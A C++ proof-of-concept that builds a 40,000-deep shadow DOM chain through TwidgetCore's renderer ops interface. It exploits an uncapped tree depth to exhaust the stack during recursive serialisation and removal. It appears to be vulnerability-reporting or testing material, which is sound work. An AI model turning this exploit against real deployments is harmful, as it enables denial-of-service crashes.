// Host PoC: stack exhaustion in TwidgetCore from a deep (but validator-legal) shadow DOM.
// The validator caps nodes (50k) and ops per batch (10k) but not depth; every build
// serialises the shadow tree recursively (Renderer::serialize_node) and rm/forget is
// recursive too. A widget can build the chain over a few ticks with allowed tags (div).
#include "renderer.h"

#include <cstdio>
#include <cstdlib>
#include <string>
#include <vector>

using twidget::Json;
using namespace twlite;

namespace {
struct StubBackend : Backend {
    int next = 0;
    int create_font(const std::string&, float size, int, bool, const std::string&, FontMetrics& out) override {
        out.ascent = size * 0.8f; out.descent = size * 0.2f; out.height = size * 1.2f;
        out.x_height = size * 0.5f; out.zero_width = 8; return ++next;
    }
    void delete_font(int) override {}
    float text_width(int, const std::string& t) override { return 8.0f * float(t.size()); }
    bool load_image(int, const std::string&, float&, float&) override { return false; }
    void canvas_run(int, int, int, const std::vector<CanvasOp>&) override {}
    bool canvas_read(int, int, int, int w, int h, std::vector<uint8_t>& rgba) override {
        rgba.assign(size_t(w) * h * 4, 7); return true;
    }
};
Json parse(const std::string& s) { auto j = Json::parse(s); if (!j) { std::printf("bad json\n"); std::exit(2); } return *j; }
} // namespace

int main(int argc, char** argv) {
    int depth = argc > 1 ? std::atoi(argv[1]) : 40000;
    std::setvbuf(stdout, nullptr, _IONBF, 0);
    StubBackend backend;
    Renderer r(300, 1, false, backend);

    // html(2) head(3) body(4), then a chain body > 1000 > 1001 > ... (el + ins each).
    std::string ops = R"([{"op":"el","id":2,"tag":"html","adopt":"html","attrs":[]},{"op":"el","id":3,"tag":"head","adopt":"head","attrs":[]},{"op":"el","id":4,"tag":"body","adopt":"body","attrs":[]})";
    for (int i = 0; i < depth; i++) {
        int id = 1000 + i;
        int parent = i == 0 ? 4 : 1000 + i - 1;
        ops += ",{\"op\":\"el\",\"id\":" + std::to_string(id) + ",\"tag\":\"div\",\"attrs\":[]}";
        ops += ",{\"op\":\"ins\",\"parent\":" + std::to_string(parent) + ",\"id\":" + std::to_string(id) + ",\"before\":null}";
    }
    ops += "]";
    std::printf("depth %d, ops %zu bytes\n", depth, ops.size());
    // One message here; the validator's 10k-ops-per-batch cap is a policy the widget
    // satisfies over several ticks; the shadow tree it builds is the same.
    auto out = r.receive(parse(std::string("{\"type\":\"ops\",\"ops\":") + ops + "}"));
    std::printf("built, out=%zu\n", out.size());
    // Force a reserialise: an attrs change marks the document changed.
    out = r.receive(parse(R"({"type":"ops","ops":[{"op":"attr","id":1000,"name":"class","value":"x"}]})"));
    std::printf("reserialised, out=%zu\n", out.size());
    // Remove the chain: forget() recursion.
    out = r.receive(parse(R"({"type":"ops","ops":[{"op":"rm","id":1000}]})"));
    std::printf("removed, out=%zu\n", out.size());
    return 0;
}
